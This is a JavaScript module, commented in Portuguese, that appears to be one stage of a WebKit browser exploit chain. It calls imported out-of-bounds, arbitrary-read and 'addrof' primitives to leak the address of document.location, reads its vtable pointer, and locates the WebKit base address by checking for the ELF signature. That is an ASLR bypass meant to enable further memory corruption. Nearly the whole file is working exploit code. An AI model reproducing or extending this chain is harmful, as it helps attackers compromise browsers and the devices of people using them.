// js/script3/testArrayBufferVictimCrash.mjs (v111 - Estratégia Final com HeisenbugAddrof)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Substitui a primitiva 'addrof' (NaN Boxing) defeituosa pela primitiva alternativa
//   'attemptAddrofUsingCoreHeisenbug' importada de 'core_exploit.mjs'.
// - O código agora é totalmente dependente das primitivas do 'core_exploit'.
// - Adiciona tratamento para o objeto de resultado retornado pela nova primitiva 'addrof'.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    isOOBReady,
    arb_read,
    selfTestOOBReadWrite,
    attemptAddrofUsingCoreHeisenbug // Nova primitiva importada
} from '../core_exploit.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_Final_v111_HeisenbugAddrof";

// As funções de conversão Double/Int64 foram removidas pois não são mais necessárias.

// =======================================================================================
// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Atualizado para usar Heisenbug Addrof)
// =======================================================================================
async function runWebKitBaseLeakTest(arb_read_primitive) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        // 1. Obter um objeto WebKit conhecido.
        const location_obj = document.location;
        logS3(`[PASS0 1] Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);

        // 2. Usar 'attemptAddrofUsingCoreHeisenbug' para obter o endereço do objeto JS.
        logS3(`[PASS0 2] Tentando obter o endereço de 'document.location' via 'attemptAddrofUsingCoreHeisenbug'...`, "info", FNAME_LEAK_TEST);
        const addrof_result = await attemptAddrofUsingCoreHeisenbug(location_obj);
        logS3(`[PASS0 3] Resultado bruto da primitiva addrof: ${JSON.stringify(addrof_result)}`, "leak", FNAME_LEAK_TEST);

        if (!addrof_result || !addrof_result.success) {
            throw new Error(`A primitiva 'attemptAddrofUsingCoreHeisenbug' falhou: ${addrof_result.message}`);
        }
        
        // A primitiva retorna o endereço como uma string hexadecimal, então precisamos convertê-lo para um objeto AdvancedInt64.
        const location_addr = new AdvancedInt64(addrof_result.leaked_address_as_int64);
        logS3(`[PASS0 4] Endereço do objeto JSLocation (via Heisenbug): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);

        // 3. Ler o primeiro campo (8 bytes) do objeto usando a primitiva robusta 'arb_read'.
        logS3(`[PASS0 5] Lendo 8 bytes de ${toHex(location_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
        const vtable_ptr = await arb_read_primitive(location_addr, 8);
        logS3(`[PASS0 6] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
            throw new Error("Ponteiro da vtable vazado é nulo. O endereço de 'addrof' pode estar correto, mas o conteúdo é nulo.");
        }

        // 4. Calcular o endereço base alinhando o ponteiro da vtable.
        const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
        const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
        logS3(`[PASS0 7] Candidato a endereço base do WebKit (alinhado em 0x4000): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);

        // 5. Verificação da assinatura "ELF".
        logS3(`[PASS0 8] Lendo 8 bytes de ${toHex(webkit_base_candidate)} para verificar a assinatura ELF...`, "info", FNAME_LEAK_TEST);
        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
        const elf_magic_low = elf_magic_full.low();
        logS3(`[PASS0 9] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
        
        if (elf_magic_low === 0x464C457F) { // Assinatura ELF: 0x7F + 'E' + 'L' + 'F'
            logS3(`++++++++++++ SUCESSO DE VAZAMENTO! Assinatura ELF encontrada! ++++++++++++`, "vuln", FNAME_LEAK_TEST);
            logS3(`A base do WebKit é muito provavelmente: ${toHex(webkit_base_candidate)}`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: ${toHex(elf_magic_low)}, Esperado: 0x464C457F.`);
        }

    } catch(e) {
        logS3(`[FALHA] Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        console.error(e);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas do Core ---`, "test");

    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };

    try {
        // --- FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DE L/E ---
        logS3("--- FASE 1/3: Configurando e validando ambiente OOB e L/E... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha crítica ao inicializar o ambiente OOB.");
        }
        const self_test_ok = await selfTestOOBReadWrite(logS3);
        if (!self_test_ok) {
            throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
        }
        logS3("Primitivas de Leitura/Escrita do Core estão operacionais.", "vuln");
       
        // --- FASE 2: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
        logS3("--- FASE 2/3: Tentando vazar a base do WebKit usando as primitivas do Core... ---", "subtest");
        const leak_result = await runWebKitBaseLeakTest(arb_read); // Passa apenas a primitiva 'arb_read' necessária
        
        // --- FASE 3: AVALIAR RESULTADO ---
        logS3("--- FASE 3/3: Avaliando resultado final... ---", "subtest");
        if (leak_result.success) {
             final_result = {
                success: true,
                message: "Cadeia de exploração concluída com SUCESSO. Base do WebKit VAZADA!",
                webkit_base: leak_result.webkit_base
            };
        } else {
             final_result = {
                success: false,
                message: "Cadeia de exploração executada, mas o vazamento da base do WebKit FALHOU. Verifique os logs.",
                webkit_base: null
            };
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
